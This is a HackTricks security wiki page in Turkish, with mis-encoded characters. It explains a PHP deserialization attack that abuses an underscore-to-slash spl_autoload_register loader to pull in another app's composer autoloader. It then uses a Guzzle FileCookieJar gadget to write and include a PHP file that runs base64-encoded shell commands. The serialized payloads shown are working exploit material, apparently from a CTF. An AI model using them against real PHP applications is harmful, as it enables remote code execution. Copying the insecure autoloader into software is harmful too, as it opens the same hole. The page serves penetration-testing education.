# PHP - Deserialization + Autoload Classes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ã–ncelikle, [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) nedir kontrol etmelisiniz.

## PHP deserialization + spl\_autoload\_register + LFI/Gadget

Bir **web uygulamasÄ±nda PHP deserialization** bulduÄŸumuz bir durumdayÄ±z ve **`phpggc`** iÃ§inde **gadget**'lara karÅŸÄ± **hiÃ§bir** kÃ¼tÃ¼phane zayÄ±f deÄŸil. Ancak, aynÄ± konteynerde **zayÄ±f kÃ¼tÃ¼phanelere sahip farklÄ± bir composer web uygulamasÄ±** vardÄ±. Bu nedenle, hedef **diÄŸer web uygulamasÄ±nÄ±n composer yÃ¼kleyicisini yÃ¼klemek** ve bunu **deserialization'a karÅŸÄ± zayÄ±f olan web uygulamasÄ±ndan bir gadget ile o kÃ¼tÃ¼phaneyi istismar etmek** iÃ§in kullanmaktÄ±.

AdÄ±mlar:

* Bir **deserialization** buldunuz ve mevcut uygulama kodunda **hiÃ§bir gadget** yok
* AÅŸaÄŸÄ±daki gibi bir **`spl_autoload_register`** fonksiyonunu kullanarak **herhangi bir yerel `.php` uzantÄ±lÄ± dosyayÄ± yÃ¼kleyebilirsiniz**
* Bunun iÃ§in, sÄ±nÄ±f adÄ±nÄ±n **`$name`** iÃ§inde olacaÄŸÄ± bir deserialization kullanÄ±yorsunuz. SerileÅŸtirilmiÅŸ bir nesnede sÄ±nÄ±f adÄ±nda **"/" veya "."** kullanamazsÄ±nÄ±z, ancak **kod** **alt Ã§izgileri** ("\_") **eÄŸik Ã§izgilerle** ("/") **deÄŸiÅŸtiriyor**. Yani `tmp_passwd` gibi bir sÄ±nÄ±f adÄ± `/tmp/passwd.php`'ye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lecek ve kod bunu yÃ¼klemeye Ã§alÄ±ÅŸacak.\
Bir **gadget Ã¶rneÄŸi** ÅŸÃ¶yle olacaktÄ±r: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
EÄŸer bir **dosya yÃ¼kleme** alanÄ±nÄ±z varsa ve **`.php` uzantÄ±lÄ±** bir dosya yÃ¼kleyebiliyorsanÄ±z, bu iÅŸlevselliÄŸi **doÄŸrudan kÃ¶tÃ¼ye kullanabilir** ve zaten RCE elde edebilirsiniz.
{% endhint %}

Benim durumumda, bÃ¶yle bir ÅŸeyim yoktu, ama **aynÄ± konteynerin** iÃ§inde **`phpggc` gadget'Ä±na karÅŸÄ± savunmasÄ±z bir kÃ¼tÃ¼phane** olan baÅŸka bir composer web sayfasÄ± vardÄ±.

* Bu diÄŸer kÃ¼tÃ¼phaneyi yÃ¼klemek iÃ§in, Ã¶nce **o diÄŸer web uygulamasÄ±nÄ±n composer yÃ¼kleyicisini yÃ¼klemeniz** gerekiyor (Ã§Ã¼nkÃ¼ mevcut uygulamanÄ±n yÃ¼kleyicisi diÄŸerinin kÃ¼tÃ¼phanelerine eriÅŸmeyecek). **UygulamanÄ±n yolunu bilerek**, bunu Ã§ok kolay bir ÅŸekilde elde edebilirsiniz: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Benim durumumda, composer yÃ¼kleyicisi `/www/frontend/vendor/autoload.php` iÃ§indeydi)
* Åimdi, **diÄŸer uygulamanÄ±n composer yÃ¼kleyicisini yÃ¼kleyebilirsiniz**, bu yÃ¼zden kullanmak iÃ§in **`phpgcc`** **payload'unu oluÅŸturma** zamanÄ±. Benim durumumda, **`Guzzle/FW1`** kullandÄ±m, bu da **dosya sisteminin iÃ§ine herhangi bir dosya yazmamÄ±** saÄŸladÄ±.
* NOT: **OluÅŸturulan gadget Ã§alÄ±ÅŸmÄ±yordu**, Ã§alÄ±ÅŸmasÄ± iÃ§in **o payload'u** **`chain.php`** dosyasÄ±nda **deÄŸiÅŸtirdim** ve sÄ±nÄ±flarÄ±n **tÃ¼m niteliklerini** **Ã¶zelden genel** olarak ayarladÄ±m. Aksi takdirde, dizilimi Ã§Ã¶zÃ¼lmÃ¼ÅŸ dizeden sonra, oluÅŸturulan nesnelerin niteliklerinin hiÃ§bir deÄŸeri yoktu.
* ArtÄ±k **diÄŸer uygulamanÄ±n composer yÃ¼kleyicisini yÃ¼kleme** yoluna sahibiz ve **Ã§alÄ±ÅŸan bir phpggc payload'u** var, ama **gadget kullanÄ±ldÄ±ÄŸÄ±nda yÃ¼kleyicinin yÃ¼klenmesi iÃ§in BUNU AYNI Ä°STEÄÄ°N Ä°Ã‡Ä°NDE yapmamÄ±z gerekiyor**. Bunun iÃ§in, her iki nesneyle birlikte bir serileÅŸtirilmiÅŸ dizi gÃ¶nderdim:
* **Ã–nce yÃ¼kleyicinin yÃ¼klendiÄŸini ve ardÄ±ndan payload'unu gÃ¶rebilirsiniz**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* ArtÄ±k **bir dosya oluÅŸturup yazabiliriz**, ancak kullanÄ±cÄ± **web sunucusundaki herhangi bir klasÃ¶re yazamaz**. Yani, yÃ¼klemede gÃ¶rebileceÄŸiniz gibi, PHP **`system`** Ã§aÄŸrÄ±sÄ± ile bazÄ± **base64** iÃ§eriÄŸi **`/tmp/a.php`** iÃ§inde oluÅŸturulmuÅŸtur. ArdÄ±ndan, **oluÅŸturulan `/tmp/a.php`** dosyasÄ±nÄ± yÃ¼klemek iÃ§in diÄŸer web uygulamasÄ±nÄ±n composer yÃ¼kleyicisini yÃ¼klemek Ã¼zere kullandÄ±ÄŸÄ±mÄ±z ilk tÃ¼r yÃ¼klemeyi **yeniden kullanabiliriz**. Bunu deserialization gadget'Ä±na ekleyin:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**YÃ¼kÃ¼n Ã–zeti**

* **AynÄ± konteynerdeki** farklÄ± bir web uygulamasÄ±nÄ±n composer autoload'unu yÃ¼kle
* **BaÅŸka bir web uygulamasÄ±ndan** bir kÃ¼tÃ¼phaneyi kÃ¶tÃ¼ye kullanmak iÃ§in bir phpggc gadget'Ä± yÃ¼kle (deserialization'a karÅŸÄ± savunmasÄ±z olan ilk web uygulamasÄ±nda herhangi bir gadget yoktu)
* Gadget, /tmp/a.php dosyasÄ±nda kÃ¶tÃ¼ niyetli komutlarla birlikte **PHP yÃ¼kÃ¼** iÃ§eren bir dosya oluÅŸturacak (web uygulamasÄ± kullanÄ±cÄ±sÄ±, herhangi bir web uygulamasÄ±nÄ±n herhangi bir klasÃ¶rÃ¼ne yazamaz)
* YÃ¼kÃ¼mÃ¼zÃ¼n son kÄ±smÄ±, **oluÅŸturulan php dosyasÄ±nÄ± yÃ¼kleyecek** ve komutlarÄ± Ã§alÄ±ÅŸtÄ±racak

Bu deserialization'Ä± **iki kez Ã§aÄŸÄ±rmam gerekti**. Testlerimde, ilk seferde `/tmp/a.php` dosyasÄ± oluÅŸturuldu ama yÃ¼klenmedi, ikinci seferde ise doÄŸru bir ÅŸekilde yÃ¼klendi.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
